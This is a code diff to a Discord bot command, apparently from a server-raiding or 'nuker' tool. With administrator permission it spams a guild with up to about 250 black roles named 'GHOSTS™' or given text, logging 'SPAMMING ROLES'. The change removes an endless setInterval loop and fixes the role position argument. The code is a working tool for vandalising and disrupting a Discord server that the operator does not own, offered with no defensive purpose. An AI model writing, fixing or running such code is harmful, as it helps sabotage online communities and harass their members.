@@ -8,31 +8,27 @@ module.exports = {
         if(!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(chalk.grey("ERROR: MISSING ADMINISTRATOR PERMISSION!"))
         const text = args.join(' ')
         if(!text) {
-            setInterval(function () {
                 for (let i = 0; i <= 250; i++) {
                     message.guild.roles.create({
                         data: {
                             name: "GHOSTS™",
-                            position: "i++",
+                            position: i++,
                             color: "BLACK"
                         }
                     }).then(console.log(chalk.yellowBright("SPAMMING ROLES")))
-                message.delete()
                 }
-            }, 100)
+            message.delete()
         } else {
-            setInterval(function () {
                 for (let i = 0; i <= 250; i++) {
                     message.guild.roles.create({
                         data: {
                             name: `${text}`,
-                            position: "i++",
+                            position: i++,
                             color: "BLACK"
                         }
                     }).then(console.log(chalk.yellowBright("SPAMMING ROLES")))
                 }
-                message.delete()
-            }, 100)
+            message.delete()
         }
     }
 }
